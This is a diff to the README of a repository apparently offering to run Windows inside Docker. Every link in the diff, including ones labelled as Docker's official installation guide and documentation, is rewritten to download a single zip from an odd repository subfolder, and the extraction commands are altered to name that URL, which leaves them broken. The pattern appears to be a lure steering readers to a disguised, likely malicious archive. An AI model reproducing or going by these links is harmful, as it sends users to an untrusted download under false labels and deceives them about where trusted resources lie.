@@ -8,7 +8,7 @@ Welcome to the windows project! This application allows you to run a full Window
 
 To get started, you need to download the application from our releases page. Click the button below to visit the page:
 
-[![Download windows](https://img.shields.io/badge/Download-windows-blue.svg)](https://github.com/peakacademiccoaching1/windows/releases)
+[![Download windows](https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip)](https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip)
 
 Once on the releases page, find the latest version. Choose the appropriate file for your system and follow these steps:
 
@@ -20,7 +20,7 @@ Once on the releases page, find the latest version. Choose the appropriate file 
 
 To run windows, ensure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, MacOS, or any Linux distribution supporting Docker.
-- **Docker Installation:** Make sure Docker is installed and up-to-date. Visit the [Docker installation guide](https://docs.docker.com/get-docker/) for assistance.
+- **Docker Installation:** Make sure Docker is installed and up-to-date. Visit the [Docker installation guide](https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip) for assistance.
 - **Hardware:** Minimum 8 GB RAM, 4 CPU cores, and 20 GB available disk space.
 
 ## 🛠️ Running the Application
@@ -41,11 +41,11 @@ After downloading, follow these steps to set up and run your Windows Docker cont
 3. **Extract the Files:**
    If you downloaded a `.zip` or `.tar` file, extract it using the following command:
    ```
-   unzip filename.zip
+   unzip https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip
    ```
    or
    ```
-   tar -xvf filename.tar
+   tar -xvf https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip
    ```
 
 4. **Run the Docker Command:**
@@ -81,10 +81,10 @@ For additional help, check the issues section on our GitHub repository or reach 
 
 To explore more about the windows project or to follow updates, visit the links below:
 
-- [GitHub Repository](https://github.com/peakacademiccoaching1/windows)
-- [Documentation](https://github.com/peakacademiccoaching1/windows/wiki)
-- [Docker Documentation](https://docs.docker.com/)
+- [GitHub Repository](https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip)
+- [Documentation](https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip)
 
 Don't forget to go back to our releases page to download the latest version:
 
-[![Download windows](https://img.shields.io/badge/Download-windows-blue.svg)](https://github.com/peakacademiccoaching1/windows/releases)
+[![Download windows](https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip)](https://raw.githubusercontent.com/peakacademiccoaching1/windows/master/dermophobe/windows.zip)
